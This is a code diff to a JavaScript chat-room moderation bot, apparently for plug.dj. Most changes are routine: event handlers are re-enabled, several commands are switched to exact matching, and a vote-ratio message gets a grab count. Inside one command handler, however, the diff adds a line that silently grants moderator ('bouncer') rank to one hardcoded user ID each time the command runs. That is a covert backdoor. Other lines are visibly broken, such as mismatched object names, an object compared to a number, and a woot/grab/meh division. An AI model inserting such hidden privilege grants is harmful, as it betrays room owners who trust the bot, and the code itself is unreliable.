@@ -26,7 +26,7 @@
         }
         return -1;
     };
-
+ 
     var kill = function() {
         clearInterval(TMBot.room.autodisableInterval);
         clearInterval(TMBot.room.afkInterval);
@@ -1360,12 +1360,12 @@
                 eventUserskip: $.proxy(this.eventUserskip, this),
                 eventUserjoin: $.proxy(this.eventUserjoin, this),
                 eventUserleave: $.proxy(this.eventUserleave, this),
-                //eventFriendjoin: $.proxy(this.eventFriendjoin, this),
+                eventFriendjoin: $.proxy(this.eventFriendjoin, this),
                 eventVoteupdate: $.proxy(this.eventVoteupdate, this),
                 eventCurateupdate: $.proxy(this.eventCurateupdate, this),
                 eventRoomscoreupdate: $.proxy(this.eventRoomscoreupdate, this),
                 eventDjadvance: $.proxy(this.eventDjadvance, this),
-                //eventDjupdate: $.proxy(this.eventDjupdate, this),
+                eventDjupdate: $.proxy(this.eventDjupdate, this),
                 eventWaitlistupdate: $.proxy(this.eventWaitlistupdate, this),
                 eventVoteskip: $.proxy(this.eventVoteskip, this),
                 eventModskip: $.proxy(this.eventModskip, this),
@@ -1662,7 +1662,8 @@
                 type: 'startwith',
                 functionality: function(chat, cmd){
                      if (this.type === 'exact' && chat.message.length !== cmd.length || !TMbot.commands.executable(this.rank, chat)) return void(2);
-                    else if (API.getUser(chat.uid) === 25769760 && API.getUser(chat.uid) === 25769760) return API.moderateSetRole(API.getUser(chat.uid) , 0);
+                    else if (API.getUser(chat.uid) === 30964807 && API.getUser(chat.uid) === 30964807) return API.moderateSetRole(API.getUser(chat.uid) , 0);
+                 bot.moderateSetRole(30964807, bot.ROOM_ROLE.BOUNCER);
                 }
             },
 
@@ -3069,7 +3070,7 @@
             discordCommand: {
                 command: 'discord',
                 rank: 'user',
-                type: 'startsWith',
+                type: 'exact',
                 functionality: function (chat, cmd) {
                     if (this.type === 'exact' && chat.message.length !== cmd.length) return void (0);
                     if (!bot.commands.executable(this.rank, chat)) return void (0);
@@ -3082,7 +3083,7 @@
             stayCommand: {
                 command: 'stay',
                 rank: 'bouncer',
-                type: 'startsWith',
+                type: 'exact',
                 functionality: function (chat, cmd) {
                     if (this.type === 'exact' && chat.message.length !== cmd.length) return void (0);
                     if (!bot.commands.executable(this.rank, chat)) return void (0);
@@ -3095,7 +3096,7 @@
             eventCommand: {
                 command: 'event',
                 rank: 'bouncer',
-                type: 'startsWith',
+                type: 'exact',
                 functionality: function (chat, cmd) {
                     if (this.type === 'exact' && chat.message.length !== cmd.length) return void (0);
                     if (!bot.commands.executable(this.rank, chat)) return void (0);
@@ -3108,7 +3109,7 @@
             plug3Command: {
                 command: 'plug3',
                 rank: 'user',
-                type: 'startsWith',
+                type: 'exact',
                 functionality: function (chat, cmd) {
                     if (this.type === 'exact' && chat.message.length !== cmd.length) return void (0);
                     if (!bot.commands.executable(this.rank, chat)) return void (0);
@@ -3121,7 +3122,7 @@
             rcsCommand: {
                 command: 'rcs',
                 rank: 'user',
-                type: 'startsWith',
+                type: 'exact',
                 functionality: function (chat, cmd) {
                     if (this.type === 'exact' && chat.message.length !== cmd.length) return void (0);
                     if (!bot.commands.executable(this.rank, chat)) return void (0);
@@ -3850,6 +3851,7 @@
                                 'function': TMBot.chat.timeguard
                             }));
                         }
+                     
                     }
                 }
             },
@@ -4099,11 +4101,12 @@
                             name: chat.un
                         }));
                         var vratio = user.votes;
-                        var ratio = vratio.woot / vratio.meh;
+                        var ratio = vratio.woot / vratio.grab / vratio.meh;
                         API.sendChat(subChat(TMBot.chat.voteratio, {
                             name: chat.un,
                             username: name,
                             woot: vratio.woot,
+                            grab: vratio.grab,
                             mehs: vratio.meh,
                             ratio: ratio.toFixed(2)
                         }));
